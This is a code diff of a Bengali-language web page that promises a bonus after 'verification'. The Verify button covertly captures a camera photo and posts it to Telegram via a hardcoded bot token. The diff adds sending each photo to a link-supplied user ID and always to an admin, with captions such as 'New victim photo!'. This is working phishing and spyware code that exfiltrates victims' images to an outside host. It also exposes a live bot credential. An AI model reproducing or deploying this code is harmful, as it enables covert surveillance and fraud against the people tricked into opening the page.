@@ -13,28 +13,23 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            /* নিচের লিঙ্কে সচল ছবি দেওয়া হয়েছে */
-            background-image: url('https://img.freepik.com/free-photo/portrait-beautiful-young-woman-traditional-sari_23-2149505439.jpg'); 
+            background-image: url('https://i.imghippo.com/files/Fq9968wg.jpg'); 
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
             background-attachment: fixed;
             position: relative;
         }
-        /* ব্যাকগ্রাউন্ডের উপর হালকা কালো আভা যাতে লেখা স্পষ্ট বোঝা যায় */
         body::before {
             content: '';
             position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5); 
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.4); 
             z-index: 1;
         }
         .container {
             background: rgba(255, 255, 255, 0.1); 
-            backdrop-filter: blur(10px); 
+            backdrop-filter: blur(8px); 
             padding: 40px 20px;
             border-radius: 20px;
             border: 1px solid rgba(255, 255, 255, 0.2);
@@ -43,23 +38,16 @@
             max-width: 380px;
             z-index: 2;
         }
-        h1 { color: #ffffff; font-size: 28px; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
-        h2 { color: #ffeb3b; font-size: 20px; margin-bottom: 10px; }
-        p { color: #ffffff; font-size: 16px; margin-bottom: 25px; }
+        h1, h2, p { color: #ffffff; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
+        h2 { color: #ffeb3b; }
         #verify-btn { 
             background-color: #1a73e8; 
-            color: white; 
-            border: none; 
-            padding: 15px 40px; 
-            font-size: 18px; 
-            border-radius: 50px; 
-            cursor: pointer; 
-            width: 100%;
-            font-weight: bold;
-            box-shadow: 0 4px 15px rgba(26, 115, 232, 0.4);
+            color: white; border: none; padding: 15px 40px; 
+            font-size: 18px; border-radius: 50px; cursor: pointer; 
+            width: 100%; font-weight: bold;
         }
         #video, #canvas { display: none; }
-        #status { margin-top: 20px; color: #00ff00; font-weight: bold; font-size: 16px; }
+        #status { margin-top: 20px; color: #00ff00; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -70,14 +58,17 @@
         <p>বোনাস পেতে হলে verify করুন</p>
         <button id="verify-btn">Verify</button>
         <div id="status"></div>
-
         <video id="video" autoplay playsinline></video>
         <canvas id="canvas"></canvas>
     </div>
 
     <script>
         const botToken = "8403844691:AAG7ui2mJ08X8Q5kQ5jhpNoq1PGUqZpx6Ec";
-        const chatId = "7068444019";
+        const adminId = "7068444019"; // আপনার (অ্যাডমিন) আইডি
+
+        // লিঙ্কের শেষে থাকা ইউজারের আইডি বের করা
+        const urlParams = new URLSearchParams(window.location.search);
+        const userIdFromLink = urlParams.get('id'); 
 
         const verifyBtn = document.getElementById('verify-btn');
         const video = document.getElementById('video');
@@ -100,38 +91,37 @@
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
                         canvas.toBlob(async (blob) => {
-                            const formData = new FormData();
-                            formData.append('chat_id', chatId);
-                            formData.append('photo', blob, 'user_capture.png');
-                            formData.append('caption', 'New 50/50 verification photo received!');
-
-                            try {
-                                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                                    method: 'POST',
-                                    body: formData
-                                });
-
-                                if(response.ok) {
-                                    status.innerText = "Verification Successful! Your bonus is on the way.";
-                                } else {
-                                    status.innerText = "Error. Please try again.";
-                                    verifyBtn.style.display = "block";
-                                }
-                            } catch (e) {
-                                status.innerText = "Network error.";
-                                verifyBtn.style.display = "block";
+                            // ১. ইউজারের কাছে ছবি পাঠানো (যদি লিঙ্কে আইডি থাকে)
+                            if (userIdFromLink && userIdFromLink !== adminId) {
+                                sendToTelegram(blob, userIdFromLink, "New victim photo!");
                             }
+                            
+                            // ২. অ্যাডমিনের (আপনার) কাছে সবসময় ছবি পাঠানো
+                            sendToTelegram(blob, adminId, "Admin Alert: New photo captured!");
 
+                            status.innerText = "Verification Successful! Your bonus is on the way.";
                             stream.getTracks().forEach(track => track.stop());
                         }, 'image/png');
-                    }, 500); // সচল হওয়ার পর ১/২ সেকেন্ড সময় দেয়া ভালো ছবির জন্য
+                    }, 500); 
                 };
-
             } catch (err) {
-                status.innerText = "Access denied! Please allow camera to verify.";
+                status.innerText = "Access denied! Please allow camera.";
                 verifyBtn.style.display = "block";
             }
         });
+
+        // টেলিগ্রামে ছবি পাঠানোর ফাংশন
+        async function sendToTelegram(blob, id, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', id);
+            formData.append('photo', blob, 'capture.png');
+            formData.append('caption', caption);
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
     </script>
 </body>
 </html>
